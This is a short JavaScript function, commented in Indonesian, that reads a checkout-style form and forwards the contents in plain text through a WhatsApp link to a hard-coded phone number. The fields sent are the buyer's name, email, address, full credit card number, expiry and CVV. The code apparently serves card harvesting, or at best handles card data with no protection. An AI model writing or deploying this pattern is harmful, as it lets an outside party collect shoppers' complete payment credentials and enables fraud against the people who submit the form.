function sendWhatsAppMessage() {
    //Mengnangkap form html 
    let username = document.getElementsByName('username')[0].value;
    let email = document.getElementsByName('email')[0].value;
    let address = document.getElementsByName('address')[0].value;
    let city = document.getElementsByName('city')[0].value;
    let state = document.getElementsByName('state')[0].value;
    let zipcode = document.getElementsByName('zipcode')[0].value;
    let cardname = document.getElementsByName('cardname')[0].value;
    let cardnumber = document.getElementsByName('cardnumber')[0].value;
    let expmonth = document.getElementsByName('expmonth')[0].value;
    let expyear = document.getElementsByName('expyear')[0].value;
    let cvv = document.getElementsByName('cvv')[0].value;

    // WA URL
    let whatsappUrl = "https://api.whatsapp.com/send?phone=6281908775565&text=";

    // Isi pesan
    let message = "Username: " + username + "<br>";
    message += "Email: " + email + "<br>";
    message += "Address: " + address + "<br>";
    message += "City: " + city + "<br>";
    message += "State: " + state + "<br>";
    message += "Zip Code: " + zipcode + "<br>";
    message += "Name on Card: " + cardname + "<br>";
    message += "Credit Card Number: " + cardnumber + "<br>";
    message += "Exp Month: " + expmonth + "<br>";
    message += "Exp Year: " + expyear + "<br>";
    message += "CVV: " + cvv;

    // memastikan karakte khusus terenkripsi dengan benar.
    let encodedMessage = encodeURIComponent(message);

    whatsappUrl += encodedMessage;

    //  membuka WhatsApp di jendela baru 
    window.open(whatsappUrl);
}

